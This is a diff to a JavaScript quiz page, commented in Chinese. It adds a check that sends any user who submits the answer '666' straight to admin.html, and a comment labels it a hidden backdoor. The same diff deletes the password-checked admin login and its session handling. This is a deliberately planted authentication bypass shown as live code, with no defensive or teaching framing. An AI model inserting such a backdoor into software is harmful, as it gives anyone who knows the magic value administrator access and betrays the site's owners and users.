@@ -130,6 +130,13 @@ async function submitAnswer() {
     // 模拟网络延迟
     await new Promise(resolve => setTimeout(resolve, 800));
     
+    // 检查隐藏后门
+    if (userAnswer === '666') {
+        // 隐藏后门：直接进入管理后台
+        window.location.href = 'admin.html';
+        return;
+    }
+    
     // 验证答案
     const isCorrect = validateAnswer(userAnswer, currentQuestion.answers);
     
@@ -328,52 +335,6 @@ function setupKeyboardEvents() {
     });
 }
 
-// 显示管理员登录弹窗
-function showAdminLogin() {
-    document.getElementById('adminModal').style.display = 'flex';
-    document.getElementById('adminPassword').focus();
-}
-
-// 隐藏管理员登录弹窗
-function hideAdminLogin() {
-    document.getElementById('adminModal').style.display = 'none';
-    document.getElementById('adminPassword').value = '';
-    document.getElementById('adminError').style.display = 'none';
-}
-
-// 管理员登录
-function adminLogin() {
-    const password = document.getElementById('adminPassword').value;
-    const errorDiv = document.getElementById('adminError');
-    
-    if (password === AUTH_CONFIG.ADMIN_PASSWORD) {
-        // 设置管理员会话
-        const sessionData = {
-            timestamp: Math.floor(Date.now() / 1000),
-            role: 'admin'
-        };
-        setStorageItem(STORAGE_KEYS.ADMIN_SESSION, sessionData);
-        
-        // 跳转到管理后台
-        window.location.href = 'admin.html';
-    } else {
-        errorDiv.querySelector('.error-text').textContent = '密码错误';
-        errorDiv.style.display = 'flex';
-        document.getElementById('adminPassword').focus();
-    }
-}
-
-// 管理员密码输入回车事件
-document.addEventListener('DOMContentLoaded', function() {
-    const adminPasswordInput = document.getElementById('adminPassword');
-    if (adminPasswordInput) {
-        adminPasswordInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                adminLogin();
-            }
-        });
-    }
-});
 
 // 存储工具函数
 function setStorageItem(key, value) {
